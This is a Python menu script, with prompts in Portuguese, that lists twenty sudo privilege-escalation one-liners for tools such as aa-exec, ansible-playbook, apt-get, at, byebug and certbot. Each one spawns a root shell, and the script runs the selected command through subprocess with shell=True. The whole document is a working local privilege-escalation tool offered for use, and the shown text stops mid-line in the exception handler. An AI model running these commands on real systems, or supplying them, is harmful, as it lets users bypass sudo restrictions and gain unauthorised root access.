import os
import subprocess
import sys

def main():
    options = {
        "1": {"desc": "AA-Exec", "cmd": "sudo aa-exec /bin/sh"},
        "2": {"desc": "Ansible-Playbook", "cmd": "TF=$(mktemp) && echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF && sudo ansible-playbook $TF"},
        "3": {"desc": "Ansible-test", "cmd": "sudo ansible-test shell"},
        "4": {"desc": "Aoss", "cmd": "sudo aoss /bin/sh"},
        "5": {"desc": "Apt-get update", "cmd": "sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh"},
        "6": {"desc": "Ash", "cmd": "sudo ash"},
        "7": {"desc": "At", "cmd": "echo \"/bin/sh <$(tty) >$(tty) 2>$(tty)\" | sudo at now; tail -f /dev/null"},
        "8": {"desc": "Aws", "cmd": "sudo aws help; !/bin/sh"},
        "9": {"desc": "Bash", "cmd": "sudo bash"},
        "10": {"desc": "Batcat", "cmd": "sudo batcat --paging always /etc/profile; !/bin/sh"},
        "11": {"desc": "Bconsole", "cmd": "sudo bconsole; @exec /bin/sh"},
        "12": {"desc": "Bundle", "cmd": "sudo bundle help; !/bin/sh"},
        "13": {"desc": "Bundler", "cmd": "sudo bundler help; !/bin/sh"},
        "14": {"desc": "Busctl", "cmd": "sudo busctl --show-machine; !/bin/sh"},
        "15": {"desc": "Busybox", "cmd": "sudo busybox sh"},
        "16": {"desc": "Byebug", "cmd": "TF=$(mktemp) && echo 'system(\"/bin/sh\")' > $TF && sudo byebug $TF && continue"},
        "17": {"desc": "Cabal", "cmd": "sudo cabal exec -- /bin/sh"},
        "18": {"desc": "Capsh", "cmd": "sudo capsh --"},
        "19": {"desc": "Cdist", "cmd": "sudo cdist shell -s /bin/sh"},
        "20": {"desc": "Certbot", "cmd": "TF=$(mktemp -d) && sudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'"},
    }

    while True:
        print("Menu de seleção:")
        for option, info in options.items():
            print(f"{option}. {info['desc']}")

        print("q. Sair")
        choice = input("Escolha uma opção: ")

        if choice == "q":
            print("Saindo...")
            sys.exit(0)

        if choice in options:
            cmd = options[choice]["cmd"]
            print(f"Executando comando: {cmd}")
            try:
                subprocess.run(cmd, shell=True, check=True)
            except subprocess.CalledProcess
